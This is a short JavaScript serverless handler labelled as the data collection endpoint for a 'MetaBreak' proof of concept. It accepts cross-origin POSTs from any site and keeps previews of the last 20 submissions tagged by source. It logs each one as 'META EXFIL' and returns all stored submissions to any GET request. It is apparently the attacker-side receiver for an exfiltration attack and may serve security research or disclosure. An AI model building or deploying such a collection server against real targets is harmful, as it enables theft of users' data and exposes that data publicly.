// Data collection endpoint for MetaBreak PoC
// Stores last 20 submissions in memory, retrievable via GET

const headers = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'Content-Type',
  'Access-Control-Allow-Methods': 'POST, GET, OPTIONS',
  'Content-Type': 'application/json'
};

// In-memory store (persists across warm invocations)
if (!global.__metabreak_log) global.__metabreak_log = [];

export const handler = async (event) => {
  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: JSON.stringify({ ok: true }) };
  }

  // GET: return stored submissions
  if (event.httpMethod === 'GET') {
    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({
        count: global.__metabreak_log.length,
        submissions: global.__metabreak_log
      })
    };
  }

  // POST: store submission
  const ts = new Date().toISOString();
  const body = event.body || '(empty)';
  const source = event.queryStringParameters?.source || 'unknown';

  const entry = { timestamp: ts, source, bodyLength: body.length, bodyPreview: body.substring(0, 500) };
  global.__metabreak_log.unshift(entry);
  if (global.__metabreak_log.length > 20) global.__metabreak_log.pop();

  console.log(`META EXFIL: ${ts} | source=${source} | len=${body.length}`);

  return {
    statusCode: 200,
    headers,
    body: JSON.stringify({ received: true, timestamp: ts, source, length: body.length })
  };
};
